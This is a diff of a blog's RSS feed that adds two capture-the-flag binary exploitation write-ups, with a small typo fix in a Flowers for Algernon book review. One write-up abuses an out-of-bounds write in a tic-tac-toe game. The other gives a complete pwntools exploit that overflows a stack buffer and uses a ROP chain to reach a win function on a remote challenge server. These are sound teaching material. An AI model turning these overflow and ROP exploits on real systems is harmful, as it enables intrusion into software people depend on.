+   if (result == player) return -10 + depth;
+   if (checkFreeSpaces() == 0) return 0;
+
+   if (isMaximizing) {
+      int bestScore = -1000;
+      for (int i = 0; i &#x3C; 9; i++) {
+         if (board[i] == ' ') {
+            board[i] = computer;
+            int score = minimax(board, depth + 1, false);
+            board[i] = ' ';
+            if (score > bestScore) {
+               bestScore = score;
+            }
+         }
+      }
+      return bestScore;
+   }
+   else {
+      int bestScore = 1000;
+      for (int i = 0; i &#x3C; 9; i++) {
+         if (board[i] == ' ') {
+            board[i] = player;
+            int score = minimax(board, depth + 1, true);
+            board[i] = ' ';
+            if (score &#x3C; bestScore) {
+               bestScore = score;
+            }
+         }
+      }
+      return bestScore;
+   }
+}
+
+void perfectComputerMove() {
+   int bestScore = -1000;
+   int move = -1;
+
+   for (int i = 0; i &#x3C; 9; i++) {
+      if (board[i] == ' ') {
+         board[i] = computer;
+         int score = minimax(board, 0, false);
+         board[i] = ' ';
+
+         if (score > bestScore) {
+            bestScore = score;
+            move = i;
+         }
+      }
+   }
+   board[move] = computer;
+}
+</code></pre>
+<p>That's quite some code. However, we don't need to look into most of it, for now at least. For Pwn challenges, even before completely understanding the environment of the binary, one of the first things I do is looking for leaks or potential overflows. This narrows down our search to just the functions that ask for input. In this case, it's only <code>playerMove</code>:</p>
+<pre><code>void playerMove() {
+   int x, y;
+   do{
+      printf("Enter row #(1-3): ");
+      scanf("%d", &#x26;x);
+      printf("Enter column #(1-3): ");
+      scanf("%d", &#x26;y);
+      int index = (x-1)*3+(y-1);
+      if(index >= 0 &#x26;&#x26; index &#x3C; 9 &#x26;&#x26; board[index] != ' '){
+         printf("Invalid move.\n");
+      }else{
+         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
+         break;
+      }
+   }while(1);
+}
+</code></pre>
+<p>This function makes a move for us. We give it a row and a column, for it to know what square we want to write an X in, and it places it in the board, which is a 3x3 array. From the looks of it, the <code>scanf</code> functions are properly called, meaning there's not a direct way of causing any overflow. However, there's a tiny detail that gives us the foothold to write outside this array:</p>
+<pre><code>if(index >= 0 &#x26;&#x26; index &#x3C; 9 &#x26;&#x26; board[index] != ' '){
+    printf("Invalid move.\n");
+}
+</code></pre>
+<p>This snippet rules out invalid moves. It checks two things:</p>
+<ul>
+<li>That the coordinates we gave it are valid (by translating them to the index of the array, and then checking if it the index is between 0 and 9)</li>
+<li>That said index is empty. In this Tic-Tac-Toe implementation, an empty square is represented with an empty space.</li>
+</ul>
+<p>...or does it?</p>
+<p>The condition logic is actually incorrect! Being like that, the move will only be invalid if BOTH conditions are met, which is wrong. In a proper implementation, a move is invalid even if one of the two conditions is true. The correct logic for the implementation would be the following:</p>
+<pre><code>if(index >= 0 &#x26;&#x26; index &#x3C; 9 || board[index] != ' '){ // Mind the OR!
+    printf("Invalid move.\n");
+}
+</code></pre>
+<h2>The vulnerability</h2>
+<p>This is our vulnerability, because it allows us to write outside the array. Actually, it's a limited vulnerability. It doesn't allow us to write arbitrary values in memory. Since our moves are made by writing an X into the board, the only thing we can do with this vulnerability is writing an X somewhere else. But worry not, this is enough for us to get the flag.</p>
+<p>The next step should be to see where we can actually write. What's around the board in memory? Are we writing into the stack, or somewhere else?</p>
+<p>Well, looking at the code, <code>board</code> is actually a global variable. So when we write into it, we aren't actually interacting with the stack, but with the <code>.data</code> section, which contains all global variables. So let's see what else is a global variable in our code.</p>
+<pre><code>char board[9];
+char player = 'X';
+char computer = 'O';
+void initializeBoard();
+void printBoard();
+int checkWin();
+int checkFreeSpaces();
+void playerMove();
+void perfectComputerMove();
+int minimax(char board[9], int depth, bool isMaximizing);
+</code></pre>
+<p>These are all of them. Three variables and the other functions. In practice, not much, especially because there are only three global variables. But actually, this is more than enough! The gotcha of this challenge is realizing that we're able to change the computer's character into an X. This essentially makes the computer place Xs instead of Os, making it impossible to lose or draw the game, because we're the only player!</p>
+<p>The way to exploit this isn't that difficult actually. We just need to find how far the board is to the <code>computer</code> in bytes (because<code>board</code> is a char array and we write bytes to it) and calculate what coordinates we need to get an index that corresponds to that offset, so instead of writing inside the board, we overwrite the <code>computer</code> variable for it to have an X instead of an O.</p>
+<h2>Finding the offset</h2>
+<p>To find the offset I used our good old favorite tool, GDB. I have pwndbg integrated to it but it isn't necessary for this challenge.</p>
+<p>First I added a breakpoint in main just to let the program initialize, and I started the program.</p>
+<pre><code>pwndbg> break main
+pwndbg> run
+</code></pre>
+<p>Then I  used the <code>vmmap</code> command to see the different sections the binary has.</p>
+<pre><code>pwndbg> vmmap
+0x555555554000     0x555555555000 r--p     1000       0 chall
+0x555555555000     0x555555556000 r-xp     1000    1000 chall
+0x555555556000     0x555555557000 r--p     1000    2000 chall
+0x555555557000     0x555555558000 r--p     1000    2000 chall
+0x555555558000     0x555555559000 rw-p     1000    3000 chall
+0x7ffff7db2000     0x7ffff7db5000 rw-p     3000       0 [anon_7ffff7db2]
+0x7ffff7db5000     0x7ffff7ddd000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
+0x7ffff7ddd000     0x7ffff7f41000 r-xp   164000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+</code></pre>
+<p>The <code>.data</code> section has read and write permissions, so <code>0x555555558000</code> seemed like an appropriate address for <code>.data</code> to be. So I dove a bit deeper:</p>
+<pre><code>pwndbg> x/15gx 0x555555558000
+0x555555558000 &#x3C;putchar@got.plt>:	0x0000555555555036	0x0000555555555046
+0x555555558010 &#x3C;setbuf@got.plt>:	0x0000555555555056	0x0000555555555066
+0x555555558020 &#x3C;strcspn@got.plt>:	0x0000555555555076	0x0000555555555086
+0x555555558030 &#x3C;fopen@got.plt>:	0x0000555555555096	0x00005555555550a6
+0x555555558040:	0x0000000000000000	0x0000555555558048
+0x555555558050 &#x3C;player>:	0x0000000000004f58	0x00007ffff7f9c5c0
+0x555555558060 &#x3C;completed.0>:	0x0000000000000000	0x0000000000000000
+0x555555558070 &#x3C;board+8>:	0x0000000000000000
+</code></pre>
+<p>Jackpot.</p>
+<p>We now see how the global variables are structured in the <code>.data</code> section. There's a bit of an issue with the mapping because the <code>computer</code> variable is not displayed, but it's there. Both the <code>player</code> and <code>computer</code> variables are <code>char</code>s, one byte long. Looking at the address of <code>player</code>, we can see two non-null bytes:</p>
+<pre><code>pwndbg> x/2bx &#x26;player 
+0x555555558050 &#x3C;player>:	0x58	0x4f
+</code></pre>
+<p>These are ASCII characters, <code>X</code> and <code>O</code> respectively! Now we know what address we need to overwrite. If <code>0x555555558050</code> corresponds to the player character, <code>0x555555558051</code> corresponds to the computer character! Knowing that the board starts at address <code>0x555555558068</code>, in order to get the offset we just need to subtract the the <code>computer</code> address with the <code>board</code> address: <code>0x555555558051 - 0x555555558068 = -23</code>, meaning that the offset is -23 bytes. That's our index!</p>
+<h2>Calculating the coordinates</h2>
+<p>Now we need to give the program the appropriate coordinates to generate an index of -23. The program uses <code>int index = (x-1)*3+(y-1)</code> to get the index, so assuming <code>x = 1</code>, we'll need <code>y = -22</code> to get an index of -23. That's all. We can connect to the server and use these values to get the flag.</p>
+<pre><code>$ nc chall.lac.tf 30001
+You want the flag? You'll have to beat me first!
+   |   |   
+---|---|---
+   |   |   
+---|---|---
+   |   |   
+
+Enter row #(1-3): 1
+Enter column #(1-3): -22
+
+   |   |   
+---|---|---
+   | X |   
+---|---|---
+   |   |   
+
+Enter row #(1-3): 1
+Enter column #(1-3): 1
+
+ X |   |   
+---|---|---
+   | X |   
+---|---|---
+   |   | X 
+
+How's this possible? Well, I guess I'll have to give you the flag now.
+lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
+</code></pre>
+<p>Notice how I had to play one regular move to complete the game. But we managed to make the computer write an X instead of an O, making it impossible to draw. We beat the unbeatable algorithm!</p>
+]]></description>
+            <link>https://markelmencia.com/writeups/lactf-2026-tic-tac-no</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/lactf-2026-tic-tac-no</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[KnightCTF 2026: Knight Squad Academy]]></title>
+            <description><![CDATA[<h1>KnightCTF 2026: Knight Squad Academy</h1>
+<h4>January 21, 2026</h4>
+<p>This is the only Pwn challenge in this CTF. We are given a binary called <code>ksa_kiosk</code>, and a server to connect to and get the flag. Since the description doesn't give us any useful information ("Its our academy... :D"), let's do some initial analysis on the binary:</p>
+<pre><code>$ file ksa_kiosk
+ksa_kiosk: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8102e9931dc90046182737ff6b4feb54e24527fe, for GNU/Linux 4.4.0, stripped
+</code></pre>
+<p>With this we can confirm that the binary in question is an ELF executable, which is not surprising. However, we can also see that the binary is stripped, which will make investigating it a little harder; we'll likely have to use a decompiler to get a full picture of what the binary does. Either way, let's check the binary security measures:</p>
+<pre><code>$ checksec --file=ksa_kiosk
+RELRO           STACK CANARY      NX            PIE             RPATH      
+Full RELRO      No canary found   NX enabled    No PIE          No RPATH
+...  
+</code></pre>
+<p>This is some good news. The binary doesn't have a canary, and PIE is disabled. At least, overflowing might be easier.</p>
+<p>Before we jump into the internal analysis, let's first see what happens if we execute the binary:</p>
+<pre><code>$ chmod 755 ksa_kiosk
+$ ./ksa_kiosk
+====================================================
+             Knight Squad Academy
+           Enrollment Kiosk  (v2.1)
+====================================================
+Authorized personnel only. All actions are audited.
+
+1) Register cadet
+2) Enrollment status
+3) Exit
+> 
+</code></pre>
+<p>It looks like a menu, with two useful options:</p>
+<pre><code>> 2
+[Registry] Enrollment status: PENDING REVIEW
+[Registry] Background check: IN PROGRESS
+</code></pre>
+<p>The second option seems to be printing some information. However, there's no way to input anything from here, so let's check the first option:</p>
+<pre><code>> 1
+
+--- Cadet Registration ---
+Cadet name:
+> Alice
+Enrollment notes:
+> test
+[Enrollment] Entry received.
+Welcome, Cadet Alice.
+Please wait for assignment.
+</code></pre>
+<p>Okay, this time we do have some inputs. It seems like we can input a name, and some notes. Since there's no other way to input information to this program, this has to be the vulnerable code.</p>
+<h2>The vulnerability</h2>
+<p>Before we delve into the binary, let's make the preparations for the exploit script we will be building:</p>
+<pre><code>from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf = context.binary = ELF("./ksa_kiosk", checksec=False)
+p = gdb.debug(elf.path, gdbscript="")
+</code></pre>
+<p>With this code I'm essentially initializing a GDB instance in a different <code>tmux</code> window, so we can easily debug our payload.</p>
+<p>Now I'm going to attempt to overflow the stack. First, we need to start the cadet registration function, which allowed us to input values. This is done with the option <code>1</code>:</p>
+<pre><code>p.sendlineafter(b">", b"1")
+</code></pre>
+<p>Starting this function will ask us for input twice, to set a name and the enrollment notes. I'll write a regular name, like "Alice", and attempt to overflow the stack in the second input:</p>
+<pre><code>p.sendlineafter(b">", b"Alice")
+p.sendlineafter(b">", b"A"*200)
+</code></pre>
+<p>I'll set the interactive mode right after just so we have time to see what actually happened.</p>
+<pre><code>p.interactive()
+</code></pre>
+<p>Now, let's run our script:</p>
+<pre><code>$ tmux
+$ python3 exploit.py
+</code></pre>
+<p>A second window should open, with GDB on it. In my case, I have <code>pwndbg</code> integrated on my GDB, which makes debugging much more convenient, I highly recommend installing it. In any case, to actually run the program, we need to type <code>continue</code>:</p>
+<pre><code>pwndbg> continue
+...
+Program received signal SIGSEGV (fault address: 0x0).
+...
+</code></pre>
+<p>Nice! That's a good sign.</p>
+<p>Checking the disassembly, we can see in what instruction the code stopped (the instruction that caused the segmentation fault). Indeed, that instruction was the return instruction.</p>
+<pre><code>0x401686    ret   &#x3C;0x4141414141414141>
+</code></pre>
+<p>This instruction attempts to return to address <code>0x4141414141414141</code>, which is invalid. This is the pile of <code>A</code>'s we used to overflow the stack. We succeeded.</p>
+<p>In order to find the offset of the return address, so we know how many <code>A</code>'s we need to write before we reach the actual address we want to return to, I'll send in a deterministic cyclic pattern instead of an arbitrary number of <code>A</code>'s, so we can track down the offset:</p>
+<pre><code># p.sendlineafter(b">", b"A"*200) BEFORE
+p.sendlineafter(b">", cyclic(200, n=8)) # AFTER
+</code></pre>
+<p>This will send a 200-character long, 8-byte cyclic pattern. Let's see what the return address is after executing the script again:</p>
+<pre><code>► 0x401686    ret    &#x3C;0x6161616161616170>
+</code></pre>
+<p>Now the return address is slightly different. The pattern we generated is very handful because we can always track down where a fragment of said pattern is, inside the pattern. We can do this with the <code>cyclic_find</code> function.</p>
+<pre><code>OFFSET = cyclic_find(0x6161616161616170, n=8)
+</code></pre>
+<p>This will give us the return address offset. In other words, the number of characters we need to write before we reach the return address. Let's go back to the code:</p>
+<pre><code># p.sendlineafter(b">", cyclic(200, n=8)) BEFORE
+p.sendlineafter(b">", b"A"*OFFSET + p64(0xAEAE)) # AFTER
+</code></pre>
+<p>Now, we'll write as many <code>A</code>'s as we need to reach the return address. For now, I'll write <code>0xAEAE</code> as the return address.</p>
+<p>To recap, we've found the vulnerability and we know how to exploit it, which is awesome. However, how can we get the flag now? We have the means to exploit the binary, but not the end. We need to find a function that will give us the flag somehow.</p>
+<p>Since the binary is stripped, running <code>info functions</code> in GDB to see all functions in the binary will not work. In these cases, the easiest thing to do is to use a decompiler like GHidra to have a somewhat readable code representation of the execution flow.</p>
+<h2>Finding the win function</h2>
+<p>A fast way to decompile a binary is using the <a href="https://dogbolt.org/">Dogbolt Decompiler Explorer</a>, an online tool that can decompile small binaries just fine, with decompilers like GHidra or BinaryNinja. If this page doesn't meet your needs, you'll probably have to resort to the actual GHidra software or other tools.</p>
+<p>The GHidra decompiler in Dogbolt will decompile a few functions. <code>CTRL+F</code>ing the word "flag" will lead us to a function in particular:</p>
+<pre><code>void FUN_004013ac(long param_1)
+
+{
+	char local_98 [136];
+	FILE *local_10;
+  
+	if (param_1 != 0x1337c0decafebeef) {
+	    puts("[SECURITY] Authorization failed.");
+	    fflush(stdout);
+	    FUN_004011c6("Session terminated.");
+	}
+	local_10 = fopen("./flag.txt","r");
+	if (local_10 == (FILE *)0x0) {
+	    FUN_004011c6("Server error.");
+	}
+...
+</code></pre>
+<p>This looks promising! There is a function in the code, that doesn't get called naturally, that prints the flag, judging by that <code>fopen</code> call. The name of the function actually refers to its address in memory, so now we now that the address to this code is <code>0x004013AC</code>. We can use it as the return address in our exploit.</p>
+<p>However, there's something else we need to overcome.</p>
+<h2>Bypassing authorization</h2>
+<p>Looking into the code of the win function, there seems to be a sort of authorization system.</p>
+<pre><code>if (param_1 != 0x1337c0decafebeef) {
+	puts("[SECURITY] Authorization failed.");
+    fflush(stdout);
+	FUN_004011c6("Session terminated.");
+}
+</code></pre>
+<p>This code will run if the win function parameter is not a specific value: <code>0x1337c0decafebeef</code>. Looking at <code>FUN_004011c6</code>, we can see how it will always exit:</p>
+<pre><code>void FUN_004011c6(char *param_1)
+
+{
+    puts(param_1);
+    fflush(stdout);
+    _exit(1);
+}
+</code></pre>
+<p>This means that calling the win function is not enough. We need the argument to be <code>0x1337c0decafebeef</code> to avoid the program exiting. How do we do this?</p>
+<p>To bypass the authorization, looking at the decompiled C won't be enough, we need to dive deeper, into the assembly of the binary. We can do this in a fresh GDB instance:</p>
+<pre><code>$ gdb ksa_kiosk
+pwndbg> x/10i 0x004013ac
+0x4013ac:    push   rbp
+   0x4013ad:    mov    rbp,rsp
+   0x4013b0:    sub    rsp,0xa0
+   0x4013b7:    mov    QWORD PTR [rbp-0x98],rdi
+   0x4013be:    movabs rax,0x1337c0decafebeef
+   0x4013c8:    cmp    QWORD PTR [rbp-0x98],rax
+   0x4013cf:    je     0x4013fe
+   0x4013d1:    lea    rax,[rip+0xd80]        # 0x402158
+   0x4013d8:    mov    rdi,rax
+   0x4013db:    call   0x401040 &#x3C;puts@plt>
+</code></pre>
+<p>With this command we can print the first 10 instructions inside the win function. Take a look into the <code>cmp</code> instruction, which checks if the code should jump into the <code>Authorization failed.</code> section or not:</p>
+<pre><code>0x4013c8:    cmp    QWORD PTR [rbp-0x98],rax
+</code></pre>
+<p>We have to track two values: The value in <code>rax</code>, and whatever is stored in <code>QWORD PTR [rbp-0x98]</code>. Actually, looking back in the function, we can easily see what's stored in both values. In <code>rax</code> the value <code>0x1337c0decafebeef</code> is stored, thanks to the <code>movabs</code> instruction. This confirms that the <code>cmp</code> instruction will check if the argument we provided is the appropriate one. And just before, we see how the value inside <code>rdi</code> is what gets compared with <code>rax</code>, because the value of <code>rdi</code> is stored in the memory address than then gets compared:  <code>QWORD PTR [rbp-0x98]</code>. With this, we can conclude that the function argument is stored in <code>rdi</code>!</p>
+<p>Now, how do move <code>0xc0decafebeef</code> into <code>rdi</code>, so we pass the check? This involves are very used technique in binary exploitation: a ROP chain. We need to find a <code>pop rdi</code> gadget, which will allow us to store in <code>rdi</code> a value in the stack, which we have control of.</p>
+<p>In order to find the gadgets of the binary, we can use the <code>rop</code> command in <code>pwndbg</code>:</p>
+<pre><code>pwndbg> rop
+...
+0x40150b: pop rdi ; ret
+...
+</code></pre>
+<p>Awesome! We are lucky enough to have a <code>pop rdi; ret</code> gadget in our binary. With this, we can build our ROP chain. Instead of directly jumping into the win function, first, we'll jump to the gadget by changing the return address to <code>0x40150b</code>. After the return address, we'll write <code>0x1337c0decafebeef</code>. This will mean that when the code reaches the return address, it will jump to an instruction that will pop into <code>rdi</code> the value we want. Then, there's another <code>ret</code> instruction, in which we'll have to jump into the actual win function, now that we have in <code>rdi</code> the appropriate value that will be the function argument.</p>
+<pre><code>POP_RDI_GADGET_ADDRESS = p64(0x40150b)
+ARG_VALUE = p64(0x1337c0decafebeef)
+WIN_FUNCTION = p64(0x004013ac)
+
+# p.sendlineafter(b">", b"A"*OFFSET + p64(0xAEAE)) BEFORE
+p.sendlineafter(b">", b"A"*OFFSET + POP_RDI_GADGET_ADDRESS + ARG_VALUE + WIN_FUNCTION)
+</code></pre>
+<p>Now that we have our exploit, we need to change the process to a remote instance, in which we will connect to the socket given to us in the challenge to actually get the flag:</p>
+<pre><code># p = gdb.debug(elf.path, gdbscript="") BEFORE
+p = remote("66.228.49.41", 5000) # AFTER
+</code></pre>
+<p>Let's run it now:</p>
+<pre><code>$ python3 exploit.py
+[+] Opening connection to 66.228.49.41 on port 5000: Done
+[*] Switching to interactive mode
+ [Enrollment] Entry received.
+Welcome, Cadet AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x91.
+Please wait for assignment.
+[Registry] Clearance badge issued:
+Your Flag : KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_} ... Visit our website : knightsquad.academy
+[*] Got EOF while reading in interactive
+</code></pre>
+<p>That's our flag! Here's the full script:</p>
+<pre><code>from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+# elf = context.binary = ELF("./ksa_kiosk", checksec=False)
+# p = gdb.debug(elf.path, gdbscript="")
+p = remote("66.228.49.41", 5000)
+
+OFFSET = cyclic_find(0x6161616161616170, n=8)
+POP_RDI_GADGET_ADDRESS = p64(0x40150b)
+ARG_VALUE = p64(0x1337c0decafebeef)
+WIN_FUNCTION = p64(0x004013ac)
+
+p.sendlineafter(b">", b"1")
+p.sendlineafter(b">", b"Alice")
+p.sendlineafter(b">", b"A"*OFFSET + POP_RDI_GADGET_ADDRESS + ARG_VALUE + WIN_FUNCTION)
+
+p.interactive()
+</code></pre>
+]]></description>
+            <link>https://markelmencia.com/writeups/knightctf2026-knight-squad-academy-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/knightctf2026-knight-squad-academy-writeup</guid>
+            <pubDate>Wed, 21 Jan 2026 00:00:00 GMT</pubDate>
+        </item>
         <item>
             <title><![CDATA[Book review: Flowers for Algernon]]></title>
             <description><![CDATA[<h1>Book review: Flowers for Algernon by Daniel Keyes</h1>
@@ -18,7 +1135,7 @@
 <h2>Summary</h2>
 <p>Our protagonist is Charlie Gordon, a grown adult with an abnormally low IQ that works in a bakery for a living. Charlie has always struggled with reading, writing and doing everyday tasks overall. However, he has a burning motivation to learn, to eventually become as smart as his peers. It is this motivation what makes him the chosen candidate to undergo a surgery that presumably will make him smarter (this surgery is the only bit of science-fiction in the book). This surgery had already been tested on a mouse called Algernon, with exceedingly good results.</p>
 <p>After the surgery, it didn't take look for Charlie to become much smarter, even surpassing the expectations of the doctors by far. The plot is told to us by the reports Charlie himself wrote, even before the surgery, with which the evolution of his awareness can be appreciated. We get to see what he learns, the relationships he develops with the doctors, peers and other people in his circle, and how he adapts to this new perspective he has acquired.</p>
-<p>Charlie achieves exactly what he wanted, becoming a genius in a matter of weeks, even leaving behind the intelligence of the very doctors that were researching him. He participates in conventions, learns multiple languages, and even learns about psychology, the science that made him was he was.</p>
+<p>Charlie achieves exactly what he wanted, becoming a genius in a matter of weeks, even leaving behind the intelligence of the very doctors that were researching him. He participates in conventions, learns multiple languages, and even learns about psychology, the science that made him what he was.</p>
 <p>However, with his intelligence, something else came back: his memories. Slowly, Charlie starts having reminiscences about his past, and realizes that he lived in a toxic and abusive family environment, and that the people that he once considered friends were just laughing at his lower intelligence, day after day. This torments him and makes him commit erratic decisions. We realize how his heart could not keep up with the speed his brain was developing at.</p>
 <p>To make matters worse, the intelligence of Algernon, the mouse that was treated before him, began deteriorating, to the point where it was even lower than the one he started with, which led to his death. This makes Charlie go on a research rampage to figure out why it happened. Sure enough, he ends up finding the reason why, making him realize that at worst, he'll share the same fate as Algernon.</p>
 <p>The book ends with Charlie going to an asylum, writing the same way he was writing before the surgery, with nothing but bits of what he ended up achieving during his illustrious phase.</p>
